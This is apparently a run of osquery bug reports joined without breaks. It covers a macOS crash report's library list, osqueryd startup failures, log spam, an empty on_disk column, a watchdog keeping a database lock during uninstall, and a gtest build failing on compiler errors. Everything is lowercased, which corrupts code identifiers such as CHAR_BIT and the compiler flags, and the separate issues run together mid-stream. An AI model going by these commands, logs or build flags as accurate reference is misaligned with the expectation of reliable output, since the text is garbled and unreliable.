<92752a96-d1cf-3ca1-837a-1e075ae4c642> /usr/lib/libcrfsuite.dylib - libchinesetokenizer.dylib (28.15.3) <55572692-4918-3c54-ad35-726e03ec47d5> /usr/lib/libchinesetokenizer.dylib - libdiagnosticmessagesclient.dylib (107) <15210ac0-61f9-3f9d-a159-a009f62eb537> /usr/lib/libdiagnosticmessagesclient.dylib - libfosl_dynamic.dylib (18.3.2) <d67b74e9-eb95-38bc-995c-5f4cc044c3f7> /usr/lib/libfosl_dynamic.dylib - libmobilegestalt.dylib (645.220.9) <c2c55511-993b-34d2-9040-902bfda38141> /usr/lib/libmobilegestalt.dylib - libopenscriptingutil.dylib (179) <441a2e60-5d5c-3567-9b00-aa22e6ee5358> /usr/lib/libopenscriptingutil.dylib - libsystem.b.dylib (1252.200.5) <c6201660-5e17-397d-ba21-c503420cd706> /usr/lib/libsystem.b.dylib - libthaitokenizer.dylib (2.15.1) <f09eb0bb-1e8a-3391-bef5-7d91f0715a62> /usr/lib/libthaitokenizer.dylib - libapple_nghttp2.dylib (1.24.1) <71c126c5-d869-3e67-9778-058fa7f3ca74> /usr/lib/libapple_nghttp2.dylib - libarchive.2.dylib (54.200.3) <32b8634d-e465-3f6d-b254-a20d44504508> /usr/lib/libarchive.2.dylib - libauto.dylib (187) <003def68-0c59-3afb-a7b7-a1b5ed301af2> /usr/lib/libauto.dylib - libbsm.0.dylib (39.200.18) <58a9acec-bf46-3a4e-86f5-3dd9ad7095b4> /usr/lib/libbsm.0.dylib - libbz2.1.0.dylib (38.200.3) <4dec3797-087f-3c8d-815b-48e895813251> /usr/lib/libbz2.1.0.dylib - libc++.1.dylib (400.9.4) <b260ac33-eb9a-30c6-8746-d011b3b02b08> /usr/lib/libc++.1.dylib - libc++abi.dylib (400.17) <446f4748-8a89-3d2e-ae1c-27eebe93a8ab> /usr/lib/libc++abi.dylib - libcharset.1.dylib (51.200.6) <43f7e100-f5d1-36ab-a26e-cf94196a19c0> /usr/lib/libcharset.1.dylib - libcmph.dylib (6.15.1) <ceda6538-c071-3b5a-948e-df61e2878983> /usr/lib/libcmph.dylib - libcompression.dylib (52.200.13) <05a2a91b-d24d-39e8-a071-261cbc5bb158> /usr/lib/libcompression.dylib - libcoretls.dylib (155.220.1) <1229f9ea-c070-3d03-9dc6-f548c59f9fd5> /usr/lib/libcoretls.dylib - libcoretls_cfhelpers.dylib (155.220.1) <33661841-3c3b-3608-86ac-c88d1cd6fe98> /usr/lib/libcoretls_cfhelpers.dylib - libcups.2.dylib (462.10) <29b6d106-a5f2-321d-8916-90f595545d88> /usr/lib/libcups.2.dylib - libenergytrace.dylib (17.200.1) <f5ba8134-16f9-31cd-90e1-d1ebebada4ae> /usr/lib/libenergytrace.dylib - libgermantok.dylib (17.15.2) <9381b152-5cfd-3d23-a5a7-4d64ee55b85e> /usr/lib/libgermantok.dylib - libheimdal-asn1.dylib (520.220.2) <d851a47d-e162-35f8-b8d4-6abea7ffdad7> /usr/lib/libheimdal-asn1.dylib - libiconv.2.dylib (51.200.6) <9fb95807-7c62-32b7-a19f-946d7fb7cca6> /usr/lib/libiconv.2.dylib - libicucore.a.dylib (62109.0.1) <feb89bd3-79c4-3208-a754-7e6bc4d38548> /usr/lib/libicucore.a.dylib - liblangid.dylib (128.15.1) <663d0a24-7260-31d1-9bfe-74d67b6f72f6> /usr/lib/liblangid.dylib - liblzma.5.dylib (10.200.3) <9a52a949-0cb1-39b6-9244-d079fb609559> /usr/lib/liblzma.5.dylib - libmecab.1.0.0.dylib (779.24.1) <590bc39c-2a3e-368b-9499-c808b84c4955> /usr/lib/libmecab.1.0.0.dylib - libmecabra.dylib (779.24.1) <22bfd5a8-ea42-3dc3-8910-f27dcfb1b631> /usr/lib/libmecabra.dylib - libnetwork.dylib (1229.240.1) <f99593da-3089-3008-be5b-5ac096ebf3a3> /usr/lib/libnetwork.dylib - libobjc.a.dylib (750.1) <804715f4-f52d-34d0-8fec-a25dc08513c3> /usr/lib/libobjc.a.dylib - libpam.2.dylib (22.200.1) <85253002-89f2-3872-9c8a-1801303a2ebb> /usr/lib/libpam.2.dylib - libpcap.a.dylib (79.200.4) <6d25197a-2f7c-3147-a45a-f6f13e55909f> /usr/lib/libpcap.a.dylib - libresolv.9.dylib (65.200.2) <a1a77b4e-1af0-3039-9945-d05440494e00> /usr/lib/libresolv.9.dylib - libsqlite3.dylib (274.22) <b30e3b7e-e22e-37a0-a3eb-ea333adee13e> /usr/lib/libsqlite3.dylib - libutil.dylib (51.200.4) <10c5e165-0939-363a-9d13-7076f3b513ec> /usr/lib/libutil.dylib - libxar.1.dylib (404) <16e875b3-cf89-3059-87bb-36d301b32e7b> /usr/lib/libxar.1.dylib - libxml2.2.dylib (32.8) <3e7875ac-3195-3800-ac48-8aa3b7be51e4> /usr/lib/libxml2.2.dylib - libxslt.1.dylib (16.1) <d6ebfebb-f88e-398f-b1b5-66f413c2cd32> /usr/lib/libxslt.1.dylib - libz.1.dylib (70.200.4) <15f7b40a-424c-33bb-bf2c-7e8195128b78> /usr/lib/libz.1.dylib - libcache.dylib (81) <704331ac-e43d-343a-8c24-39201142af27> /usr/lib/system/libcache.dylib - libcommoncrypto.dylib (60118.220.1) <9c865644-ee9a-3662-ab77-7c8a5e561784> /usr/lib/system/libcommoncrypto.dylib - libcompiler_rt.dylib (63.4) <817772e3-e836-3ffd-a39b-bdcd1c357221> /usr/lib/system/libcompiler_rt.dylib - libcopyfile.dylib (146.200.3) <5c5c4f35-dab7-3cf1-940f-f47192ab8289> /usr/lib/system/libcopyfile.dylib - libcorecrypto.dylib (602.230.1) <c78d1a87-5543-3561-beb4-3b480ba94ecb> /usr/lib/system/libcorecrypto.dylib - libdispatch.dylib (1008.220.2) <2fdb1401-5119-3df0-91f5-f4e105f00cd7> /usr/lib/system/libdispatch.dylib - libdyld.dylib (655.1) <90c801e7-5d05-37a8-810c-b58e8c53953a> /usr/lib/system/libdyld.dylib - libkeymgr.dylib (30) <a4efd9a4-2ef3-3e18-b325-f527e3821939> /usr/lib/system/libkeymgr.dylib - libkxld.dylib (4903.241.1) <d039b38d-e8e6-3011-94f5-a21cd3d59526> /usr/lib/system/libkxld.dylib - liblaunch.dylib (1336.240.2) <d5f0014d-cf46-3b04-9de0-a1466da14a2c> /usr/lib/system/liblaunch.dylib - libmacho.dylib (921) <6adb99f3-d142-3a0a-b3ce-031354766acc> /usr/lib/system/libmacho.dylib - libquarantine.dylib (86.220.1) <58524fd7-63c5-38e0-9d90-845a79551c14> /usr/lib/system/libquarantine.dylib - libremovefile.dylib (45.200.2) <ba53ca8a-9974-3a43-9265-b110b1ae470f> /usr/lib/system/libremovefile.dylib - libsystem_asl.dylib (356.200.4) <33c62769-1242-3bc1-9459-13cbcdecc7fe> /usr/lib/system/libsystem_asl.dylib - libsystem_blocks.dylib (73) <152edadf-7d94-35f2-89b7-e66dcd945bba> /usr/lib/system/libsystem_blocks.dylib - libsystem_c.dylib (1272.200.26) <d6c701a2-9f17-308d-b6ac-9e17ef31b7df> /usr/lib/system/libsystem_c.dylib - libsystem_configuration.dylib (963.200.27) <94898525-ecc8-3cc9-b312-cbeaac305e32> /usr/lib/system/libsystem_configuration.dylib - libsystem_coreservices.dylib (66) <10818c17-70e1-328e-a3e3-c3eb81aec590> /usr/lib/system/libsystem_coreservices.dylib - libsystem_darwin.dylib (1272.200.26) <07468cf7-982f-37c4-83d0-d5e602a683aa> /usr/lib/system/libsystem_darwin.dylib - libsystem_dnssd.dylib (878.240.1) <5fea5e1e-e80f-3616-ad33-8e936d61f31a> /usr/lib/system/libsystem_dnssd.dylib - libsystem_info.dylib (517.200.9) <54b65f21-2e93-3579-9b72-6637a03245d9> /usr/lib/system/libsystem_info.dylib - libsystem_kernel.dylib (4903.241.1) <ca10bc3a-5b09-32ce-b74f-bad01755aa37> /usr/lib/system/libsystem_kernel.dylib - libsystem_m.dylib (3158.200.7) <af25f8e8-194c-314f-a2d3-a424853ee796> /usr/lib/system/libsystem_m.dylib - libsystem_malloc.dylib (166.220.1) <4777dc06-f9c6-356e-82ab-86a1c6d62f3a> /usr/lib/system/libsystem_malloc.dylib - libsystem_networkextension.dylib (767.240.1) <4db0d4a2-83e7-3638-aaa0-39cecd5c25f8> /usr/lib/system/libsystem_networkextension.dylib - libsystem_notify.dylib (172.200.21) <65b3061d-41d7-3485-b217-a861e05ad50b> /usr/lib/system/libsystem_notify.dylib - libsystem_platform.dylib (177.200.16) <83ded753-51ec-3b8c-a98d-883a5184086b> /usr/lib/system/libsystem_platform.dylib - libsystem_pthread.dylib (330.230.1) <80cc5992-823e-327e-bb6e-9d4568b84161> /usr/lib/system/libsystem_pthread.dylib - libsystem_sandbox.dylib (851.230.3) <d6469a17-c13c-3538-a300-d6517bb7f249> /usr/lib/system/libsystem_sandbox.dylib - libsystem_secinit.dylib (30.220.1) <5964b6d2-19d4-3cf9-bdbc-4eb1d42348f1> /usr/lib/system/libsystem_secinit.dylib - libsystem_symptoms.dylib (820.237.2) <487e1794-4c6e-3b1b-9c55-95b1a5ff9b90> /usr/lib/system/libsystem_symptoms.dylib - libsystem_trace.dylib (906.220.1) <4d4ba88a-fa32-379d-8860-33838723b35f> /usr/lib/system/libsystem_trace.dylib - libunwind.dylib (35.4) <ef1a77fd-a86b-39f5-abea-6100ab23583a> /usr/lib/system/libunwind.dylib - libxpc.dylib (1336.240.2) <ee0cda53-6ff9-3b4e-a571-335a5ff6b6f4> /usr/lib/system/libxpc.dylib external modification summary: calls made by other processes targeting this process: task_for_pid: 0 thread_create: 0 thread_set_state: 0 calls made by this process: task_for_pid: 0 thread_create: 0 thread_set_state: 0 calls made by all processes on this machine: task_for_pid: 259517 thread_create: 0 thread_set_state: 0 vm region summary:
readonly portion of libraries: total=340.3m resident=0k(0%) swapped_out_or_unallocated=340.3m(100%)
writable regions: total=112.1m written=0k(0%) resident=0k(0%) swapped_out=0k(0%) unallocated=112.1m(100%) virtual region region type size count (non-coalesced) =========== ======= ======= activity tracing 256k 2 dispatch continuations 16.0m 2 kernel alloc once 8k 2 malloc 82.5m 12 malloc guard page 16k 5 stack guard 56.0m 12 stack 13.1m 12 __data 16.7m 190 __font_data 4k 2 __linkedit 216.4m 4 __text 123.9m 189 __unicode 564k 2 mapped file 24k 2 shared memory 12k 4 =========== ======= ======= total 525.5m 426 ```
`osqueryd` starts then dies: ```
mar 13 09:34:28 test osqueryd: osqueryd started [version=3.3.2]
mar 13 09:34:28 test osqueryd[621]: e0313 09:34:28.511849 621 init.cpp:457] osqueryd initialize failed: error querying processes: no such table: processes
mar 13 09:34:28 test systemd[1]: osqueryd.service: main process exited, code=exited, status=1/failure
``` we'd like to be able to disable the `processes` table without having it break `osqueryd`.
dozens of messages along the lines of:
i0219 22:52:25.481289 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:25.497977 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:25.502287 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:30.479017 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:30.495429 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:30.501274 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:30.518716 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:30.523978 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:35.480245 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:35.484972 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:35.501571 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:35.506012 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:36.470991 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.481230 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.497017 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.515534 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.520326 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.536695 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.541376 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0219 22:52:40.541496 56307 killswitch.cpp:60] osquery::killswitch::isenablederror 1 (cannot call registry item: )
dozens of errors about unsupported fields:
i0219 22:52:25.481339 56307 profiler.cpp:64] rusage field "scheduler.executing_query.process_events.success.input.load" is not supported
i0219 22:52:25.498037 56307 profiler.cpp:64] rusage field "scheduler.executing_query.selinux_events.success.input.load" is not supported
i0219 22:52:25.502338 56307 profiler.cpp:64] rusage field "scheduler.executing_query.socket_events.success.input.load" is not supported
i0219 22:52:30.479079 56307 profiler.cpp:64] rusage field "scheduler.executing_query.file_events.success.input.load" is not supported
i0219 22:52:30.495491 56307 profiler.cpp:64] rusage field "scheduler.executing_query.hardware_events.success.input.load" is not supported
i0219 22:52:30.501327 56307 profiler.cpp:64] rusage field "scheduler.executing_query.process_events.success.input.load" is not supported
i0219 22:52:30.518777 56307 profiler.cpp:64] rusage field "scheduler.executing_query.selinux_events.success.input.load" is not supported
i0219 22:52:30.524031 56307 profiler.cpp:64] rusage field "scheduler.executing_query.socket_events.success.input.load" is not supported
i0219 22:52:35.480345 56307 profiler.cpp:64] rusage field "scheduler.executing_query.file_events.success.input.load" is not supported
i0219 22:52:35.485064 56307 profiler.cpp:64] rusage field "scheduler.executing_query.process_events.success.input.load" is not supported
i0219 22:52:35.501616 56307 profiler.cpp:64] rusage field "scheduler.executing_query.selinux_events.success.input.load" is not supported
i0219 22:52:35.506057 56307 profiler.cpp:64] rusage field "scheduler.executing_query.socket_events.success.input.load" is not supported
i0219 22:52:36.471040 56307 profiler.cpp:64] rusage field "scheduler.executing_query.crontab.success.input.load" is not supported
i0219 22:52:40.481281 56307 profiler.cpp:64] rusage field "scheduler.executing_query.file_events.success.input.load" is not supported
i0219 22:52:40.497062 56307 profiler.cpp:64] rusage field "scheduler.executing_query.hardware_events.success.input.load" is not supported
i0219 22:52:40.515627 56307 profiler.cpp:64] rusage field "scheduler.executing_query.ld_preload.success.input.load" is not supported
i0219 22:52:40.520372 56307 profiler.cpp:64] rusage field "scheduler.executing_query.process_events.success.input.load" is not supported
i0219 22:52:40.536752 56307 profiler.cpp:64] rusage field "scheduler.executing_query.selinux_events.success.input.load" is not supported
i0219 22:52:40.541546 56307 profiler.cpp:64] rusage field "scheduler.executing_query.socket_events.success.input.load" is not supported
``` these queries seem to be working okay, but i'm not sure what this error means and if it needs to be corrected.
osquery> select count(1) from processes where path in ('a','b','c','d','e','f','g','h');
i0121 13:09:52.299521 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.309139 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.317179 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.323804 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.329715 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.335345 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.341004 2920076160 processes.cpp:473] genprocesses
i0121 13:09:52.346843 2920076160 processes.cpp:473] genprocesses
``` i see one "genprocesses()" line for every item in the list (8 times in the example above)
as you can imagine, frequent queries on processes looking for specific paths can add significant load to the system
especially the old wmi-based processes table.
the `on_disk` column is not set to any integer, appears to be set to an empty value, but is also not queryable
c:\\programdata\\osquery>osqueryi --json
i0114 17:09:30.234248 9080 database.cpp:563] checking database version for migration
i0114 17:09:30.234248 9080 database.cpp:587] performing migration: 0 -> 1
i0114 17:09:30.234248 9080 database.cpp:619] migration 0 -> 1 successfully completed!
i0114 17:09:30.234248 9080 database.cpp:587] performing migration: 1 -> 2
i0114 17:09:30.234248 9080 database.cpp:619] migration 1 -> 2 successfully completed!
i0114 17:09:31.391165 9080 events.cpp:745] subscriber expiration is too low: powershell_events
using a \x1b[1mvirtual database\x1b[0m
need help, type '.help'
osquery> select name, path, pid, on_disk from processes where name='bad.exe';
[ {"name":"bad.exe","on_disk":"","path":"c:\\\\users\\\\ieuser\\\\bad.exe","pid":"3648"}
osquery> select name, path, pid, on_disk from processes where on_disk = "";
osquery> select name, path, pid, on_disk from processes where on_disk = null;
after stopping osqueryd, which reports as stopped, i see an osqueryd.exe process still running and keeping a file lock on osquery.db
this started as an issue during uninstallation of osquery, but i'm expanding it to include the stopping of the service
we have multiple extensions running with osquery
related thread from slack:
greetings all, 2 part question
1) when stopping osqueryd service, there still remains an osqueryd.exe process, which i assume is the watchdog process
this looks to keep a lock on osquery.db/, which prevents a clean uninstall
is that expected behavior? 2) i'm trying to build a custom msi with the wix toolset and using a custom action to taskkill osqueryd.exe, but that doesn't work
anyone have some experience there? i'm using 3.3.1 from git as my source and testing on windows 10
1.) not expected behavior
if you can reliable repro this would you mind cutting an issue for us? we had issues with this previously, and we've seen it happening in our environment, but specifically it's only when we have extensions running with the watchdog process disabled
osquery on it's own, no extensions, with watchdog _enabled_ doesn't seem to have this issue from what i've seen on 3.3.1 thor
2.) for the custom wix script -- we have a `tools\\deployment\\make_windows_package.ps1` i think, which renders the xml for a wix script to create an msi for deployment
it's pretty basic and generic, but you should be able to follow what that script is doing and make changes as needed to get your custom logic
aside from that i think @groob had some experience messing with wix scripts for deployment?
thrift_poll errors followed by plugin restarts
the more frequent this query is scheduled, the more often the plugin restarts.
this is the output from the second run, with error "no such table" on the view
c:\\programdata\\osquery\\osqueryd>osqueryd.exe
i1205 22:22:16.836755 916 database.cpp:563] checking database version for migration
i1205 22:22:16.977397 916 options.cpp:103] verbose logging enabled by config option
i1205 22:22:16.977397 916 killswitch.cpp:60] enum osquery::killswitch::isenablederror 1 (cannot call registry item: )
i1205 22:22:17.008628 916 main.cpp:109] not starting the distributed query service: distributed query service not enabled.
i1205 22:22:17.008628 1640 events.cpp:784] starting event publisher run loop: windows_events
i1205 22:22:17.008628 3584 scheduler.cpp:100] executing scheduled query users: select * from users;
i1205 22:22:17.196151 3584 killswitch.cpp:60] enum osquery::killswitch::isenablederror 1 (cannot call registry item: )
i1205 22:22:30.211689 3584 scheduler.cpp:100] executing scheduled query users_view: select * from users_view;
e1205 22:22:30.321038 3584 scheduler.cpp:105] error executing scheduled query users_view: error running query: no such table: users_view
i1205 22:22:30.336673 3584 killswitch.cpp:60] enum osquery::killswitch::isenablederror 1 (cannot call registry item: )
verbose=1 make gtest
re-run cmake no build system arguments
-- welcome to osquery's build -- thank you for your patience! :)
-- for a brief tutorial see:
-- if at first you dont succeed, perhaps: make distclean; make depsclean
-- building for platform ubuntu (ubuntu, bionic)
-- building osquery version 3.3.1 sdk 3.3.1
-- configuring done
-- generating done
-- build files have been written to: /home/paulo/data/git/osquery/build/bionic
/usr/local/osquery/cellar/cmake/3.12.0-rc1_100/bin/cmake -h/home/paulo/data/git/osquery -b/home/paulo/data/git/osquery/build/bionic --check-build-system cmakefiles/makefile.cmake 0
make -f cmakefiles/makefile2 gtest
/usr/local/osquery/cellar/cmake/3.12.0-rc1_100/bin/cmake -h/home/paulo/data/git/osquery -b/home/paulo/data/git/osquery/build/bionic --check-build-system cmakefiles/makefile.cmake 0
/usr/local/osquery/cellar/cmake/3.12.0-rc1_100/bin/cmake -e cmake_progress_start /home/paulo/data/git/osquery/build/bionic/cmakefiles 1
make -f cmakefiles/makefile2 third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/all
make -f third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/build.make third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/depend
cd /home/paulo/data/git/osquery/build/bionic && /usr/local/osquery/cellar/cmake/3.12.0-rc1_100/bin/cmake -e cmake_depends "unix makefiles" /home/paulo/data/git/osquery /home/paulo/data/git/osquery/third-party/googletest/googletest /home/paulo/data/git/osquery/build/bionic /home/paulo/data/git/osquery/build/bionic/third-party/googletest/googlemock/gtest /home/paulo/data/git/osquery/build/bionic/third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/dependinfo.cmake --color=
make -f third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/build.make third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/build
[ 0%] building cxx object third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/src/gtest-all.cc.o
cd /home/paulo/data/git/osquery/build/bionic/third-party/googletest/googlemock/gtest && /usr/local/osquery/bin/clang++ -dboost_config_suppress_outdated_message -dboost_network_enable_https -dgtest_use_own_tr1_tuple=1 -dndebug -dnominmax -dosquery_build_distro=bionic -dosquery_build_platform=ubuntu -dosquery_build_sdk_version=3.3.1 -dosquery_posix -drapidjson_has_stdstring=1 -drapidjson_no_sizetypedefine -dstrip_flag_help=1 -dthrift_squelch_console_output=1 -dubuntu -dubuntu_bionic -d__assert_macros_define_versions_without_underscores=0 -i/home/paulo/data/git/osquery/third-party/sqlite3 -i/home/paulo/data/git/osquery/include -i/home/paulo/data/git/osquery -i/home/paulo/data/git/osquery/third-party/linenoise-ng -i/home/paulo/data/git/osquery/build/bionic/generated/gen-cpp -i/home/paulo/data/git/osquery/third-party/googletest/googletest/include -i/home/paulo/data/git/osquery/third-party/googletest/googletest -isystem /home/paulo/data/git/osquery/third-party/sysroots/linux -isystem /usr/local/osquery/include/c++/v1 -isystem /usr/local/osquery/legacy/include -isystem /usr/local/osquery/include -isystem /usr/local/osquery/lib/clang/4.0.0/include -std=c++14 -stdlib=libc++ -o3 -dndebug -std=c++14 -stdlib=libc++ -dgtest_has_pthread=1 -qunused-arguments -wabi-tag -wno-unused-local-typedef -wno-deprecated-register -wno-unknown-warning-option -wstrict-aliasing -wno-missing-field-initializers -wnon-virtual-dtor -wchar-subscripts -wpointer-arith -woverloaded-virtual -wformat -wformat-security -werror=format-security -fpermissive -fstack-protector-all -pipe -fdata-sections -ffunction-sections -fvisibility=hidden -fvisibility-inlines-hidden -oz -g -fno-limit-debug-info -fpie -fpie -fpic -fpic -flto=thin -march=x86-64 -mno-avx -o cmakefiles/gtest.dir/src/gtest-all.cc.o -c /home/paulo/data/git/osquery/third-party/googletest/googletest/src/gtest-all.cc
in file included from /home/paulo/data/git/osquery/third-party/googletest/googletest/src/gtest-all.cc:39:
in file included from /home/paulo/data/git/osquery/third-party/googletest/googletest/include/gtest/gtest.h:55:
in file included from /usr/local/osquery/include/c++/v1/ostream:138:
in file included from /usr/local/osquery/include/c++/v1/ios:216:
in file included from /usr/local/osquery/include/c++/v1/__locale:18:
in file included from /usr/local/osquery/include/c++/v1/mutex:191:
in file included from /usr/local/osquery/include/c++/v1/__mutex_base:15:
in file included from /usr/local/osquery/include/c++/v1/chrono:305:
/usr/local/osquery/include/c++/v1/ratio:142:61: error: use of undeclared identifier 'char_bit' static const intmax_t min = (1ll << (sizeof(intmax_t) * char_bit - 1)) + 1; ^
/usr/local/osquery/include/c++/v1/ratio:160:61: error: use of undeclared identifier 'char_bit' static const intmax_t min = (1ll << (sizeof(intmax_t) * char_bit - 1)) + 1; ^
/usr/local/osquery/include/c++/v1/ratio:174:61: error: use of undeclared identifier 'char_bit' static const intmax_t min = (1ll << (sizeof(intmax_t) * char_bit - 1)) + 1; ^
/usr/local/osquery/include/c++/v1/ratio:192:61: error: use of undeclared identifier 'char_bit' static const intmax_t min = (1ll << (sizeof(intmax_t) * char_bit - 1)) + 1; ^
/usr/local/osquery/include/c++/v1/ratio:203:61: error: use of undeclared identifier 'char_bit' static const intmax_t nan = (1ll << (sizeof(intmax_t) * char_bit - 1)); ^
/usr/local/osquery/include/c++/v1/ratio:239:61: error: use of undeclared identifier 'char_bit' static const intmax_t nan = (1ll << (sizeof(intmax_t) * char_bit - 1)); ^
in file included from /home/paulo/data/git/osquery/third-party/googletest/googletest/src/gtest-all.cc:39:
in file included from /home/paulo/data/git/osquery/third-party/googletest/googletest/include/gtest/gtest.h:55:
in file included from /usr/local/osquery/include/c++/v1/ostream:138:
in file included from /usr/local/osquery/include/c++/v1/ios:216:
in file included from /usr/local/osquery/include/c++/v1/__locale:18:
in file included from /usr/local/osquery/include/c++/v1/mutex:191:
in file included from /usr/local/osquery/include/c++/v1/__mutex_base:15:
/usr/local/osquery/include/c++/v1/chrono:507:75: error: use of undeclared identifier 'char_bit' static const intmax_t max = -((intmax_t(1) << (sizeof(intmax_t) * char_bit - 1)) + 1); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long, std::__1::ratio<3600, 1> >::__no_overflow<std::__1::ratio<3600, 1>, std::__1::ratio<3600, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1093:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long, _period2 = std::__1::ratio<3600, 1>] return chrono::hours(static_cast<chrono::hours::rep>(__h)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<3600, 1> >::__no_overflow<std::__1::ratio<3600, 1>, std::__1::ratio<3600, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1098:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<3600, 1>] return chrono::duration<long double, ratio<3600,1>>(__h); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long, std::__1::ratio<60, 1> >::__no_overflow<std::__1::ratio<60, 1>, std::__1::ratio<60, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1104:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long, _period2 = std::__1::ratio<60, 1>] return chrono::minutes(static_cast<chrono::minutes::rep>(__m)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<60, 1> >::__no_overflow<std::__1::ratio<60, 1>, std::__1::ratio<60, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1109:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<60, 1>] return chrono::duration<long double, ratio<60,1>> (__m); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long long, std::__1::ratio<1, 1> >::__no_overflow<std::__1::ratio<1, 1>, std::__1::ratio<1, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1115:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long long, _period2 = std::__1::ratio<1, 1>] return chrono::seconds(static_cast<chrono::seconds::rep>(__s)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<1, 1> >::__no_overflow<std::__1::ratio<1, 1>, std::__1::ratio<1, 1> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1120:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<1, 1>] return chrono::duration<long double> (__s); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long long, std::__1::ratio<1, 1000> >::__no_overflow<std::__1::ratio<1, 1000>, std::__1::ratio<1, 1000> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1126:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long long, _period2 = std::__1::ratio<1, 1000>] return chrono::milliseconds(static_cast<chrono::milliseconds::rep>(__ms)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<1, 1000> >::__no_overflow<std::__1::ratio<1, 1000>, std::__1::ratio<1, 1000> >' requested here __no_overflow<_period2, period>::value && ( ^
